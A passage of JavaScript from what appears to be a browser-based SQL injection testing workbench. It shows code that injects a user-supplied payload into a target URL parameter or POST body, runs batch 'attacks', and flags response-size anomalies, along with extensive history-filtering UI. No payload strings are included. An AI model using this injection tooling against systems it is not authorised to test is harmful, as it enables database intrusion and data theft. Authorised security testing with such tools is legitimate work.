        postBodySection.style.display = 'none';
      }
    }
    methodSelect.addEventListener('change', updateBodyVisibility);
    updateBodyVisibility(); // initial

    // Inject SQLi payload into URL (for GET)
    injectBtn.addEventListener('click', () => {
      const payload = payloadInput.value.trim();
      if (!payload) { showToast('Payload is empty'); return; }
      const method = methodSelect.value;

      // If POST/PUT → prefer injecting into body
      if (['POST', 'PUT', 'PATCH'].includes(method)) {
        injectPayloadIntoBody();
        return;
      }

      let url = urlInput.value.trim();
      if (!url) { showToast('Set a target URL first'); return; }
      try {
        if (url.includes('?')) {
          const [base, qs] = url.split('?');
          const params = qs.split('&');
          if (params.length && params[params.length - 1].includes('=')) {
            const key = params[params.length - 1].split('=')[0];
            params[params.length - 1] = key + '=' + payload;
            url = base + '?' + params.join('&');
          } else {
            url = url + (url.endsWith('&') || url.endsWith('?') ? '' : '&') + 'id=' + payload;
          }
        } else {
          url = url + '?id=' + payload;
        }
        urlInput.value = url;
        showToast('Payload injected into URL', 'success');
      } catch { showToast('Injection failed'); }
    });

    // Inject SQLi payload into POST body (replace last param value or append)
    function injectPayloadIntoBody() {
      const payload = payloadInput.value.trim();
      if (!payload) { showToast('Payload is empty'); return; }
      let body = postBodyInput.value.trim();

      if (!body) {
        // Empty body → start with a common param
        postBodyInput.value = 'id=' + payload;
        showToast('Payload set as body (id=...)', 'success');
        return;
      }

      // If body looks like application/x-www-form-urlencoded
      if (body.includes('=') && !body.trimStart().startsWith('{') && !body.trimStart().startsWith('[')) {
        const parts = body.split('&');
        if (parts.length && parts[parts.length - 1].includes('=')) {
          const key = parts[parts.length - 1].split('=')[0];
          parts[parts.length - 1] = key + '=' + payload;
          postBodyInput.value = parts.join('&');
        } else {
          postBodyInput.value = body + (body.endsWith('&') ? '' : '&') + 'id=' + payload;
        }
        showToast('Payload injected into Body (form)', 'success');
      } else {
        // Raw / JSON body → append payload at the end
        postBodyInput.value = body + payload;
        showToast('Payload appended to Body', 'success');
      }
    }

    injectIntoBodyBtn.addEventListener('click', injectPayloadIntoBody);
    clearBodyBtn.addEventListener('click', () => {
      postBodyInput.value = '';
      postBodyInput.focus();
    });

    // ===== History: Render + Delete + Rename + Pin + Drag =====
    function getSortedHistory() {
      // Pinned first (preserve relative order), then the rest
      const pinned = state.history.filter(h => h.pinned);
      const unpinned = state.history.filter(h => !h.pinned);
      return [...pinned, ...unpinned];
    }

    function getUrlPath(url) {
      try {
        const u = new URL(url);
        let path = u.pathname || '/';
        if (u.search) path += u.search;
        return path.length > 48 ? path.slice(0, 46) + '…' : path;
      } catch {
        return (url || '').slice(0, 48);
      }
    }

    function formatBytes(n) {
      n = Number(n) || 0;
      if (n < 1024) return n + ' B';
      if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
      return (n / (1024 * 1024)).toFixed(1) + ' MB';
    }

    function formatRelativeTime(ts) {
      const diff = Math.max(0, Date.now() - ts);
      const sec = Math.floor(diff / 1000);
      if (sec < 5) return 'just now';
      if (sec < 60) return sec + 's ago';
      const min = Math.floor(sec / 60);
      if (min < 60) return min + 'm ago';
      const hr = Math.floor(min / 60);
      if (hr < 24) return hr + 'h ago';
      const days = Math.floor(hr / 24);
      return days + 'd ago';
    }

    function formatExactTime(ts) {
      try {
        return new Date(ts).toLocaleString();
      } catch {
        return '';
      }
    }

    function matchesStatusFilter(item, filter) {
      if (filter === 'all') return true;
      if (filter === 'starred') return !!item.pinned;
      if (filter === 'batch') {
        // Multi-select attack filter
        const selected = state.selectedBatchIds || [];
        if (selected.length) return selected.includes(item.batchId);
        return !!item.batchId;
      }
      if (filter === 'single') return !item.batchId;
      if (filter && filter.startsWith('batch:')) {
        return item.batchId === filter.slice(6);
      }
      const status = item.response.status;
      if (filter === '0') return status === 0;
      if (filter === '2xx') return status >= 200 && status < 300;
      if (filter === '3xx') return status >= 300 && status < 400;
      if (filter === '4xx') return status >= 400 && status < 500;
      if (filter === '5xx') return status >= 500;
      return true;
    }

    function getKnownAttacks() {
      // Prefer attackSources, also discover from history
      const map = {};
      Object.entries(state.attackSources || {}).forEach(([id, src]) => {
        map[id] = {
          id,
          name: src.name || id,
          count: state.history.filter(h => h.batchId === id).length,
        };
      });
      state.history.forEach(h => {
        if (!h.batchId) return;
        if (!map[h.batchId]) {
          map[h.batchId] = {
            id: h.batchId,
            name: h.batchName || h.batchId,
            count: 0,
          };
        }
        map[h.batchId].count++;
        if (h.batchName) map[h.batchId].name = h.batchName;
      });
      return Object.values(map).sort((a, b) => (b.count - a.count));
    }

    function openAttackPicker() {
      const ov = $('#atkPickerOverlay');
      const list = $('#atkPickerList');
      if (!ov || !list) return;
      const attacks = getKnownAttacks();
      if (!attacks.length) {
        showToast('No attacks in history yet');
        return;
      }
      const selected = new Set(state.selectedBatchIds || []);
      list.innerHTML = attacks.map(a => `
        <label class="atk-picker-item${selected.has(a.id) ? ' selected' : ''}" data-id="${escapeHtml(a.id)}">
          <input type="checkbox" ${selected.has(a.id) ? 'checked' : ''} />
          <span class="atk-name" title="${escapeHtml(a.name)}">⚡ ${escapeHtml(a.name)}</span>
          <span class="atk-meta">${a.count} req</span>
        </label>
      `).join('');
      list.querySelectorAll('.atk-picker-item').forEach(el => {
        const cb = el.querySelector('input');
        const sync = () => el.classList.toggle('selected', cb.checked);
        cb.addEventListener('change', sync);
        el.addEventListener('click', (e) => {
          if (e.target === cb) return;
          e.preventDefault();
          cb.checked = !cb.checked;
          sync();
        });
      });
      ov.classList.add('open');
    }

    function closeAttackPicker() {
      $('#atkPickerOverlay')?.classList.remove('open');
    }

    function applyAttackPicker() {
      const list = $('#atkPickerList');
      if (!list) return;
      const ids = [...list.querySelectorAll('.atk-picker-item')].filter(el => el.querySelector('input')?.checked).map(el => el.dataset.id);
      state.selectedBatchIds = ids;
      state.hfActive = 'batch';
      state.historyStatusFilter = 'batch';
      if (historyStatusFilter) historyStatusFilter.value = 'batch';
      closeAttackPicker();
      renderHfChips();
      renderHistory();
      showToast(ids.length ? `Showing ${ids.length} attack(s)` : 'Showing all attacks', 'success');
    }

    // Attack picker buttons
    (function bindAttackPicker() {
      $('#atkPickerApply')?.addEventListener('click', applyAttackPicker);
      $('#atkPickerCancel')?.addEventListener('click', closeAttackPicker);
      $('#atkPickerClose')?.addEventListener('click', closeAttackPicker);
      $('#atkPickerSelectAll')?.addEventListener('click', () => {
        $$('#atkPickerList input[type=checkbox]').forEach(cb => {
          cb.checked = true;
          cb.closest('.atk-picker-item')?.classList.add('selected');
        });
      });
      $('#atkPickerSelectNone')?.addEventListener('click', () => {
        $$('#atkPickerList input[type=checkbox]').forEach(cb => {
          cb.checked = false;
          cb.closest('.atk-picker-item')?.classList.remove('selected');
        });
      });
    })();

    // ===== Advanced History Filter Engine =====
    const HF_RULES_KEY = 'sqli-workbench-hf-rules';
    const HF_PRESETS = [
      { id: 'all', label: 'All', cls: 'chip-all' },
      { id: 'starred', label: '★ Star', cls: 'chip-star' },
      { id: '2xx', label: '2xx', cls: 'chip-2xx' },
      { id: '4xx', label: '4xx', cls: 'chip-4xx' },
      { id: '5xx', label: '5xx', cls: 'chip-5xx' },
      { id: '0', label: 'ERR', cls: 'chip-err' },
      { id: 'batch', label: '⚡ Attacks', cls: 'chip-rule' },
      { id: 'single', label: 'Single', cls: 'chip-rule' },
    ];

    function loadHfRules() {
      try {
        const raw = localStorage.getItem(HF_RULES_KEY);
        const arr = raw ? JSON.parse(raw) : [];
        return Array.isArray(arr) ? arr : [];
      } catch { return []; }
    }
    function saveHfRules(rules) {
      localStorage.setItem(HF_RULES_KEY, JSON.stringify(rules));
    }
    if (!state.hfRules) state.hfRules = loadHfRules();
    if (!state.hfActive) state.hfActive = 'all'; // preset id or rule:<id>
    if (!state.hfDraft) state.hfDraft = emptyHfRule();

    function emptyHfRule() {
      return {
        statusRanges: [],
        statusExact: [],
        sizeOp: '', sizeA: null, sizeB: null,
        rttOp: '', rttA: null, rttB: null,
        urlPat: '',
        bodyPat: '',
        methods: [],
        reqPat: '',
        reqLenOp: '', reqLenA: null, reqLenB: null,
        notePat: '',
        hasNote: '',
        star: '',
      };
    }

    function safeRegex(pat, flags) {
      if (!pat) return null;
      try { return new RegExp(pat, flags || 'i'); }
      catch { return null; }
    }

    function matchNumeric(op, value, a, b) {
      if (!op) return true;
      const v = Number(value) || 0;
      const na = a != null && a !== '' ? Number(a) : null;
      const nb = b != null && b !== '' ? Number(b) : null;
      if (op === 'gt') return na != null && v > na;
      if (op === 'lt') return na != null && v < na;
      if (op === 'eq') return na != null && v === na;
      if (op === 'between') {
        if (na == null && nb == null) return true;
        if (na != null && nb != null) return v >= na && v <= nb;
        if (na != null) return v >= na;
        return v <= nb;
      }
      return true;
    }

    function matchesAdvancedRule(item, rule) {
      if (!rule) return true;
      const status = item.response?.status ?? 0;
      const bodyLen = (item.response?.body || '').length;
      const rtt = item.response?.timeMs || 0;
      const url = item.url || '';
      const respBody = item.response?.body || '';
      const method = (item.method || 'GET').toUpperCase();
      const reqBody = item.postData || item.payload || '';
      const note = item.note || '';

      // Status ranges OR exact (if any set)
      const ranges = rule.statusRanges || [];
      const exact = rule.statusExact || [];
      if (ranges.length || exact.length) {
        let ok = false;
        if (exact.length && exact.includes(status)) ok = true;
        for (const r of ranges) {
          if (r === '0' && status === 0) ok = true;
          if (r === '2xx' && status >= 200 && status < 300) ok = true;
          if (r === '3xx' && status >= 300 && status < 400) ok = true;
          if (r === '4xx' && status >= 400 && status < 500) ok = true;
          if (r === '5xx' && status >= 500) ok = true;
        }
        if (!ok) return false;
      }

      if (!matchNumeric(rule.sizeOp, bodyLen, rule.sizeA, rule.sizeB)) return false;
      if (!matchNumeric(rule.rttOp, rtt, rule.rttA, rule.rttB)) return false;

      if (rule.urlPat) {
        const re = safeRegex(rule.urlPat);
        if (re && !re.test(url)) return false;
        if (!re && !url.toLowerCase().includes(String(rule.urlPat).toLowerCase())) return false;
      }
      if (rule.bodyPat) {
        const re = safeRegex(rule.bodyPat);
        if (re && !re.test(respBody)) return false;
        if (!re && !respBody.toLowerCase().includes(String(rule.bodyPat).toLowerCase())) return false;
      }
      if (rule.methods && rule.methods.length) {
        if (!rule.methods.includes(method)) return false;
      }
      if (rule.reqPat) {
        const re = safeRegex(rule.reqPat);
        if (re && !re.test(reqBody)) return false;
        if (!re && !String(reqBody).toLowerCase().includes(String(rule.reqPat).toLowerCase())) return false;
      }
      if (!matchNumeric(rule.reqLenOp, String(reqBody).length, rule.reqLenA, rule.reqLenB)) return false;

      if (rule.notePat) {
        const re = safeRegex(rule.notePat);
        if (re && !re.test(note)) return false;
        if (!re && !note.toLowerCase().includes(String(rule.notePat).toLowerCase())) return false;
      }
      if (rule.hasNote === 'yes' && !note.trim()) return false;
      if (rule.hasNote === 'no' && note.trim()) return false;

      // Star is global AND
      if (rule.star === 'yes' && !item.pinned) return false;
      if (rule.star === 'no' && item.pinned) return false;

      return true;
    }

    function getActiveFilterRule() {
      const active = state.hfActive || 'all';
      if (active.startsWith('rule:')) {
        const id = active.slice(5);
        // Priority: first matching rule in ordered list wins when evaluating single active rule
        return state.hfRules.find(r => r.id === id) || null;
      }
      // Built-in presets mapped to simple rule or status filter
      return null;
    }

    function itemMatchesCurrentFilter(item) {
      const active = state.hfActive || 'all';
      if (active.startsWith('rule:')) {
        const rule = getActiveFilterRule();
        return matchesAdvancedRule(item, rule ? rule.conditions : null);
      }
      // Preset path (legacy status filter)
      return matchesStatusFilter(item, active);
    }

    function countHfMatches(rule) {
      const total = state.history.length;
      if (!rule) return { matched: total, total };
      let matched = 0;
      state.history.forEach(it => { if (matchesAdvancedRule(it, rule)) matched++; });
      return { matched, total };
    }

    function readAdvForm() {
      const ranges = [...document.querySelectorAll('#advStatusChecks input:checked')].map(i => i.value);
      const exactStr = ($('#advStatusExact')?.value || '').trim();
      const exact = exactStr ? exactStr.split(/[\s,]+/).map(s => parseInt(s, 10)).filter(n => !isNaN(n)) : [];
      const methods = [...document.querySelectorAll('#advMethodChecks input:checked')].map(i => i.value);
      const num = (id) => {
        const el = $(id);
        if (!el || el.value === '') return null;
        const n = Number(el.value);
        return isNaN(n) ? null : n;
      };
      return {
        statusRanges: ranges,
        statusExact: exact,
        sizeOp: $('#advSizeOp')?.value || '',
        sizeA: num('#advSizeA'), sizeB: num('#advSizeB'),
        rttOp: $('#advRttOp')?.value || '',
        rttA: num('#advRttA'), rttB: num('#advRttB'),
        urlPat: $('#advUrlPat')?.value || '',
        bodyPat: $('#advBodyPat')?.value || '',
        methods,
        reqPat: $('#advReqPat')?.value || '',
        reqLenOp: $('#advReqLenOp')?.value || '',
        reqLenA: num('#advReqLenA'), reqLenB: num('#advReqLenB'),
        notePat: $('#advNotePat')?.value || '',
        hasNote: $('#advHasNote')?.value || '',
        star: $('#advStar')?.value || '',
      };
    }

    function writeAdvForm(rule) {
      rule = rule || emptyHfRule();
      document.querySelectorAll('#advStatusChecks input').forEach(inp => {
        inp.checked = (rule.statusRanges || []).includes(inp.value);
        inp.closest('.adv-check')?.classList.toggle('on', inp.checked);
      });
      if ($('#advStatusExact')) $('#advStatusExact').value = (rule.statusExact || []).join(', ');
      const set = (id, v) => { const el = $(id); if (el) el.value = v == null ? '' : v; };
      set('#advSizeOp', rule.sizeOp || '');
      set('#advSizeA', rule.sizeA); set('#advSizeB', rule.sizeB);
      set('#advRttOp', rule.rttOp || '');
      set('#advRttA', rule.rttA); set('#advRttB', rule.rttB);
      set('#advUrlPat', rule.urlPat || '');
      set('#advBodyPat', rule.bodyPat || '');
      document.querySelectorAll('#advMethodChecks input').forEach(inp => {
        inp.checked = (rule.methods || []).includes(inp.value);
        inp.closest('.adv-check')?.classList.toggle('on', inp.checked);
      });
      set('#advReqPat', rule.reqPat || '');
      set('#advReqLenOp', rule.reqLenOp || '');
      set('#advReqLenA', rule.reqLenA); set('#advReqLenB', rule.reqLenB);
      set('#advNotePat', rule.notePat || '');
      set('#advHasNote', rule.hasNote || '');
      set('#advStar', rule.star || '');
      syncAllRangeRows();
    }

    function syncRangeRow(rowId, opId, labelId, unit) {
      const row = $(rowId);
      const op = $(opId)?.value || '';
      if (!row) return;
      const u = unit ? ` (${unit})` : '';
      row.classList.remove('op-off', 'hide-b');
      if (!op) {
        row.classList.add('op-off');
      } else if (op === 'between') {
        const lab = $(labelId);
        if (lab) lab.textContent = 'Min' + u;
      } else {
        row.classList.add('hide-b');
        const lab = $(labelId);
        if (lab) {
          if (op === 'gt') lab.textContent = 'Greater than' + u;
          else if (op === 'lt') lab.textContent = 'Less than' + u;
          else if (op === 'eq') lab.textContent = 'Equal to' + u;
          else lab.textContent = 'Value' + u;
        }
      }
    }

    function syncAllRangeRows() {
      syncRangeRow('#advSizeRow', '#advSizeOp', '#advSizeALabel', 'bytes');
      syncRangeRow('#advRttRow', '#advRttOp', '#advRttALabel', 'ms');
      syncRangeRow('#advReqLenRow', '#advReqLenOp', '#advReqLenALabel', 'bytes');
    }

    function updateAdvLiveCount() {
      const rule = readAdvForm();
      const { matched, total } = countHfMatches(rule);
      const el = $('#advLiveCount');
      if (el) el.innerHTML = `Matching <strong>${matched}</strong> / ${total} · click to preview`;
      const tc = $('#advMatchToolbarCount');
      if (tc) tc.innerHTML = `<span style="color:#00e676">${matched}</span> / ${total}`;
    }

    let advMatchViewMode = 'all'; // all | yes | no

    function renderAdvMatchList() {
      const list = $('#advMatchList');
      if (!list) return;
      const rule = readAdvForm();
      const items = [...state.history].sort((a, b) => b.timestamp - a.timestamp);
      if (!items.length) {
        list.innerHTML = '<div class="adv-hint">No requests in history yet.</div>';
        return;
      }
      const rows = [];
      items.forEach(it => {
        const ok = matchesAdvancedRule(it, rule);
        if (advMatchViewMode === 'yes' && !ok) return;
        if (advMatchViewMode === 'no' && ok) return;
        const status = it.response?.status ?? 0;
        const statusLabel = status === 0 ? 'ERR' : String(status);
        const statusColor = status === 0 || status >= 500 ? '#ff5252'
          : status >= 400 ? '#ffab40'
          : status >= 300 ? '#4fc3f7' : '#00e676';
        const url = (it.url || '').slice(0, 64);
        const rtt = it.response?.timeMs != null ? it.response.timeMs + 'ms' : '—';
        const size = formatBytes((it.response?.body || '').length);
        rows.push(`
          <div class="adv-match-item ${ok ? 'matched' : 'missed'}" data-hid="${it.id}">
            <span class="mm-badge">${ok ? '✓ MATCH' : '✗ MISS'}</span>
            <span class="mm-status" style="color:${statusColor}">${statusLabel}</span>
            <span class="mm-meta" title="${escapeHtml(it.url || '')}">#${it.id} ${escapeHtml(it.method || 'GET')} ${escapeHtml(url)}</span>
            <span style="color:var(--text-muted);flex-shrink:0">${rtt} · ${size}</span>
          </div>
        `);
      });
      list.innerHTML = rows.length
        ? rows.join('')
        : '<div class="adv-hint">No items in this view.</div>';
      list.querySelectorAll('.adv-match-item').forEach(el => {
        el.addEventListener('click', () => {
          const id = +el.dataset.hid;
          if (typeof loadHistoryItem === 'function') loadHistoryItem(id);
        });
      });
      updateAdvLiveCount();
    }

    function openAdvMatchesOverlay() {
      const ov = $('#advMatchOverlay');
      if (ov) ov.classList.add('open');
      renderAdvMatchList();
    }
    function closeAdvMatchesOverlay() {
      const ov = $('#advMatchOverlay');
      if (ov) ov.classList.remove('open');
    }

    function renderHfChips() {
      const row = $('#hfChipRow');
      if (!row) return;
      const active = state.hfActive || 'all';
      let html = HF_PRESETS.map(p => {
        const isActive = active === p.id;
        return `<button type="button" class="hf-chip ${p.cls}${isActive ? ' active' : ''}" data-hf="${p.id}"><span class="chip-dot"></span>${p.label}</button>`;
      }).join('');
      // Custom rules
      (state.hfRules || []).forEach(r => {
        const isActive = active === 'rule:' + r.id;
        html += `<button type="button" class="hf-chip chip-rule${isActive ? ' active' : ''}" data-hf="rule:${r.id}" title="${escapeHtml(r.name)}"><span class="chip-dot"></span>${escapeHtml(r.name)}<span class="chip-x" data-del-rule="${r.id}" title="Delete">×</span></button>`;
      });
      row.innerHTML = html;
      row.querySelectorAll('.hf-chip').forEach(chip => {
        chip.addEventListener('click', (e) => {
          if (e.target.classList.contains('chip-x')) {
            e.stopPropagation();
            const id = e.target.dataset.delRule;
            const rule = state.hfRules.find(r => r.id === id);
            const name = rule?.name || 'this rule';
            if (!confirm(`Delete filter rule «${name}»?\nThis cannot be undone.`)) return;
            state.hfRules = state.hfRules.filter(r => r.id !== id);
            saveHfRules(state.hfRules);
            if (state.hfActive === 'rule:' + id) state.hfActive = 'all';
            renderHfChips();
            renderHistory();
            showToast('Rule deleted');
            return;
          }
          const hf = chip.dataset.hf;
          // Attacks → open multi-select picker first
          if (hf === 'batch') {
            openAttackPicker();
            return;
          }
          state.hfActive = hf;
          if (hf !== 'batch') state.selectedBatchIds = [];
          if (historyStatusFilter && !state.hfActive.startsWith('rule:')) {
            historyStatusFilter.value = state.hfActive;
            state.historyStatusFilter = state.hfActive;
          }
          renderHfChips();
          renderHistory();
        });
      });
    }

    function renderAdvRulesList() {
      const list = $('#advRulesList');
      if (!list) return;
      if (!state.hfRules.length) {
        list.innerHTML = '<div class="adv-hint">No saved rules yet. Build conditions above and click Save Rule.</div>';
        return;
      }
      list.innerHTML = state.hfRules.map((r, i) => `
        <div class="adv-rule-item" data-id="${r.id}">
          <span class="rule-prio">#${i + 1}</span>
          <span class="rule-name">${escapeHtml(r.name)}</span>
          <button type="button" class="btn btn-sm btn-ghost" data-up="${r.id}" title="Higher priority">↑</button>
          <button type="button" class="btn btn-sm btn-ghost" data-down="${r.id}" title="Lower priority">↓</button>
          <button type="button" class="btn btn-sm btn-ghost" data-edit="${r.id}">Edit</button>
          <button type="button" class="btn btn-sm btn-ghost" data-del="${r.id}">Del</button>
        </div>
      `).join('');
      list.querySelectorAll('[data-up]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.up;
          const idx = state.hfRules.findIndex(r => r.id === id);
          if (idx > 0) {
            [state.hfRules[idx - 1], state.hfRules[idx]] = [state.hfRules[idx], state.hfRules[idx - 1]];
            saveHfRules(state.hfRules);
            renderAdvRulesList();
            renderHfChips();
          }
        });
      });
      list.querySelectorAll('[data-down]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.down;
          const idx = state.hfRules.findIndex(r => r.id === id);
          if (idx >= 0 && idx < state.hfRules.length - 1) {
            [state.hfRules[idx + 1], state.hfRules[idx]] = [state.hfRules[idx], state.hfRules[idx + 1]];
            saveHfRules(state.hfRules);
            renderAdvRulesList();
            renderHfChips();
          }
        });
      });
      list.querySelectorAll('[data-edit]').forEach(btn => {
        btn.addEventListener('click', () => {
          const rule = state.hfRules.find(r => r.id === btn.dataset.edit);
          if (!rule) return;
          writeAdvForm(rule.conditions);
          if ($('#advRuleName')) $('#advRuleName').value = rule.name;
          state.hfEditingId = rule.id;
          updateAdvLiveCount();
          // switch to status tab
          document.querySelector('.adv-filter-tab[data-atab="status"]')?.click();
        });
      });
      list.querySelectorAll('[data-del]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.del;
          state.hfRules = state.hfRules.filter(r => r.id !== id);
          saveHfRules(state.hfRules);
          if (state.hfActive === 'rule:' + id) state.hfActive = 'all';
          renderAdvRulesList();
          renderHfChips();
          renderHistory();
        });
      });
    }

    function openAdvFilter() {
      writeAdvForm(state.hfDraft || emptyHfRule());
      if ($('#advRuleName')) $('#advRuleName').value = '';
      state.hfEditingId = null;
      syncAllRangeRows();
      updateAdvLiveCount();
      renderAdvRulesList();
      if (typeof openVPanel === 'function' && VPANEL_MAP && VPANEL_MAP['adv-filter']) {
        openVPanel('adv-filter');
      } else {
        const p = $('#advFilterPanel');
        if (p) {
          p.classList.add('open');
          const bd = $('#vpanelBackdrop');
          if (bd) bd.classList.add('open');
        }
      }
    }

    // Wire advanced filter UI
    (function initAdvFilterUI() {
      const advBtn = $('#hfAdvBtn');
      if (advBtn) advBtn.addEventListener('click', openAdvFilter);

      $$('.adv-filter-tab').forEach(tab => {
        tab.addEventListener('click', () => {
          $$('.adv-filter-tab').forEach(t => t.classList.remove('active'));
          $$('.adv-filter-panel').forEach(p => p.classList.remove('active'));
          tab.classList.add('active');
          const panel = $('#atab-' + tab.dataset.atab);
          if (panel) panel.classList.add('active');
          if (tab.dataset.atab === 'rules') renderAdvRulesList();
        });
      });

      // Live count + dynamic range fields on any form change
      const panels = $('#advFilterPanels');
      if (panels) {
        panels.addEventListener('input', () => {
          updateAdvLiveCount();
          if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
        });
        panels.addEventListener('change', (e) => {
          if (e.target.matches('.adv-check input')) {
            e.target.closest('.adv-check')?.classList.toggle('on', e.target.checked);
          }
          if (e.target.matches('#advSizeOp, #advRttOp, #advReqLenOp')) {
            syncAllRangeRows();
          }
          updateAdvLiveCount();
          if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
        });
      }

      // Click match count → open Matches overlay (not a tab)
      $('#advLiveCount')?.addEventListener('click', openAdvMatchesOverlay);
      $('#advMatchCloseBtn')?.addEventListener('click', closeAdvMatchesOverlay);

      // Match view mode buttons
      $('#advMatchShowAll')?.addEventListener('click', () => { advMatchViewMode = 'all'; renderAdvMatchList(); });
      $('#advMatchShowYes')?.addEventListener('click', () => { advMatchViewMode = 'yes'; renderAdvMatchList(); });
      $('#advMatchShowNo')?.addEventListener('click', () => { advMatchViewMode = 'no'; renderAdvMatchList(); });

      $('#advApplyBtn')?.addEventListener('click', () => {
        const conditions = readAdvForm();
        state.hfDraft = conditions;
        // Apply as temporary active filter (not saved)
        const tmpId = 'tmp';
        state.hfRules = state.hfRules.filter(r => r.id !== tmpId);
        state.hfRules.unshift({ id: tmpId, name: '⚡ Applied', conditions, temp: true });
        state.hfActive = 'rule:' + tmpId;
        renderHfChips();
        renderHistory();
        showToast('Filter applied', 'success');
        // close panel
        const p = $('#advFilterPanel');
        if (p) p.classList.remove('open');
        document.querySelector('.vpanel-backdrop')?.classList.remove('open');
      });

      $('#advSaveBtn')?.addEventListener('click', () => {
        const conditions = readAdvForm();
        const name = ($('#advRuleName')?.value || '').trim() || ('Rule ' + (state.hfRules.filter(r => !r.temp).length + 1));
        if (state.hfEditingId) {
          const r = state.hfRules.find(x => x.id === state.hfEditingId);
          if (r) { r.name = name; r.conditions = conditions; delete r.temp; }
        } else {
          const id = 'r' + Date.now().toString(36);
          state.hfRules.push({ id, name, conditions });
          state.hfActive = 'rule:' + id;
        }
        // drop temp applied
        state.hfRules = state.hfRules.filter(r => !r.temp);
        saveHfRules(state.hfRules.filter(r => !r.temp));
        state.hfEditingId = null;
        renderAdvRulesList();
        renderHfChips();
        renderHistory();
        showToast('Rule saved', 'success');
      });

      $('#advClearBtn')?.addEventListener('click', () => {
        writeAdvForm(emptyHfRule());
        if ($('#advRuleName')) $('#advRuleName').value = '';
        state.hfEditingId = null;
        syncAllRangeRows();
        updateAdvLiveCount();
        if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
      });
    })();

    function ensureAttackFilterOption(batchId, attackName) {
      if (!historyStatusFilter) return;
      const val = 'batch:' + batchId;
      if ([...historyStatusFilter.options].some(o => o.value === val)) return;
      const opt = document.createElement('option');
      opt.value = val;
      opt.textContent = '⚡ ' + attackName;
      // Insert after "All Attacks"
      const batchOpt = [...historyStatusFilter.options].find(o => o.value === 'batch');
      if (batchOpt && batchOpt.nextSibling) {
        historyStatusFilter.insertBefore(opt, batchOpt.nextSibling);
      } else {
        historyStatusFilter.appendChild(opt);
      }
    }

    function applyHistorySort(items) {
      const sort = state.historySort || { key: 'time', dir: 'desc' };
      const key = sort.key;
      const dir = sort.dir === 'asc' ? 1 : -1;
      const arr = [...items];
      const bodyLen = (it) => (it.response.body || '').length;
      const redir = (it) => (it.response.finalUrl && it.response.finalUrl !== it.url) ? 1 : 0;
      const orderIdx = (it) => (it.attackIndex != null ? it.attackIndex : it.timestamp);
      arr.sort((a, b) => {
        if (a.pinned !== b.pinned) return a.pinned ? -1 : 1;
        let cmp = 0;
        switch (key) {
          case 'time': cmp = a.timestamp - b.timestamp; break;
          case 'order': cmp = orderIdx(a) - orderIdx(b); break;
          case 'status': cmp = (a.response.status || 0) - (b.response.status || 0); break;
          case 'size': cmp = bodyLen(a) - bodyLen(b); break;
          case 'rtt': cmp = (a.response.timeMs || 0) - (b.response.timeMs || 0); break;
          case 'redir': cmp = redir(a) - redir(b); break;
          default: cmp = a.timestamp - b.timestamp;
        }
        return cmp * dir;
      });
      return arr;
    }

    function updateAttackSourceBar(statusFilter) {
      const bar = $('#attackSourceBar');
      const hint = $('#attackSourceHint');
      if (!bar) return;
      if (statusFilter && statusFilter.startsWith('batch:')) {
        const bid = statusFilter.slice(6);
        const src = state.attackSources[bid];
        bar.classList.remove('hidden');
        bar.dataset.batchId = bid;
        if (hint) {
          hint.textContent = src
            ? `${src.name || bid} · ${src.urlTemplate || ''}`.slice(0, 60)
            : bid;
          hint.title = src ? `URL: ${src.urlTemplate}\nPayloads:\n${src.payloadText || ''}` : '';
        }
      } else {
        bar.classList.add('hidden');
      }
    }

    function renderHistory() {
      const histBadge = $('#historyBadge');
      if (histBadge) {
        const n = state.history.length;
        histBadge.textContent = n > 99 ? '99+' : String(n);
        histBadge.classList.toggle('hidden', n === 0);
      }
      if (state.history.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No requests yet.<br>Send a request to begin.</div>';
        updateAttackSourceBar('all');
        return;
      }

      const q = (state.historySearch || '').toLowerCase().trim();
      // Keep statusFilter in sync with hfActive for batch bar compatibility
      const statusFilter = (state.hfActive && !state.hfActive.startsWith('rule:'))
        ? state.hfActive
        : (state.historyStatusFilter || 'all');
      state.historyStatusFilter = statusFilter;
      updateAttackSourceBar(statusFilter);

      let filtered = getSortedHistory().filter((item) => {
        if (!itemMatchesCurrentFilter(item)) return false;
        if (!q) return true;
        const hay = `${item.url} ${item.payload || ''} ${item.name || ''} ${item.batchName || ''} ${item.method} ${item.response.status} ${item.note || ''}`.toLowerCase();
        return hay.includes(q);
      });

      // Match count badge
      const mc = $('#hfMatchCount');
      if (mc) {
        const total = state.history.length;
        mc.innerHTML = total
          ? `Showing <strong>${filtered.length}</strong> / ${total}`
          : '';
      }

      let sorted = applyHistorySort(filtered);

      if (sorted.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No matching requests.</div>';
        return;
      }

      // Body size stats for coloring (within current filtered set)
      const sizes = sorted.map(it => (it.response.body || '').length);
      const maxSize = Math.max(...sizes);
      const minSize = Math.min(...sizes);
      // Anomaly: sequential jump > 40% and > 150 bytes vs previous in attack order (by timestamp asc within batch)
      const anomalyIds = new Set();
      const byBatch = {};
      sorted.forEach(it => {
        if (!it.batchId) return;
        if (!byBatch[it.batchId]) byBatch[it.batchId] = [];
        byBatch[it.batchId].push(it);
      });
      Object.values(byBatch).forEach(list => {
        list.sort((a, b) => a.timestamp - b.timestamp);
        for (let i = 1; i < list.length; i++) {
          const prev = (list[i - 1].response.body || '').length;
          const cur = (list[i].response.body || '').length;
          const diff = Math.abs(cur - prev);
          if (diff > 150 && (prev === 0 || diff / prev > 0.4)) {
            anomalyIds.add(list[i].id);
          }
        }
      });

      historyList.innerHTML = '';

      const buildHistoryItemEl = (item) => {
        const el = document.createElement('div');
        el.className = 'history-item'
          + (item.id === state.activeHistoryId ? ' active' : '')
          + (item.pinned ? ' pinned' : '');
        el.dataset.id = item.id;
        el.draggable = true;
        el.title = item.url;

        const statusClass = (item.response.status === 0 || item.response.status >= 500) ? 's5xx'
          : item.response.status >= 400 ? 's4xx' : 's2xx';

        const pathLabel = getUrlPath(item.url);
        const displayName = item.name || pathLabel;
        const snippet = (item.payload || item.url).slice(0, 55);
        const statusLabel = item.response.status === 0 ? 'ERR' : item.response.status;
        const bodySize = (item.response.body || '').length;
